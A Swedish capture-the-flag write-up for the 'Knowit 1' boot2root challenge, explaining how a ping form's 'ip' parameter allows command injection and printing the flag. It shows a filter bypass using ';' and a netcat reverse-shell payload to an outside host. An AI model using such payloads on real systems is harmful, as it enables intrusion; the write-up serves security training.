# Boot2root: Knowit 1 - Initial

- **Skapare:** Knowit (Fredrik Ljung)
- **Poäng:** 300
- **Antal lösningar:** ???


## Beskrivning

En utvecklare testade leka lite med PHP, men glömde stänga ner webbservern.

Gå till http://13.74.143.253 och se om du kan ta dig in.

Notera: Brute-forcing kommer inte hjälpa dig att hitta flaggan! Dirb, gobuster och liknande är förbjudet.

## Flagga

SSM{knowit_1_Knowit_Secure_h4r_k0nt0r_i_SVeRige_oCh_Norg3_}

## Lösning

När man navigerar till hemsidan och kikar runt märker man att det inte finns något speciellt intressant.
Ett första steg då är att leta efter orefererade sidor. Genom att gå till `/robots.txt` så ser man `/network.php`.

När man kommer till /network.php och trycker på "click me" ser man ett ping-anrop till 8.8.8.8.
Man ser även att IPn kommer från GET parametern `ip`.
Testar man efter OS command injection med exempelvis `&` eller `|` får man till svar `Hacker attempt detected`.
Däremot om man använder `;` går det igenom.
Man kan köra `; sleep 10` för att konfirmera att det är en (blind) OS command injection.
Nästa steg är att sätta upp en lyssnare och skaffa ett shell.

Lyssnare:
```nc -nvlp 5555```

Payload:
```;nc 10.11.0.148 5555 -e /bin/bash```


När man fått ett shell på webbservern så kan man navigera till /home/www-data och läsa ut flaggan med `cat flag.txt`.

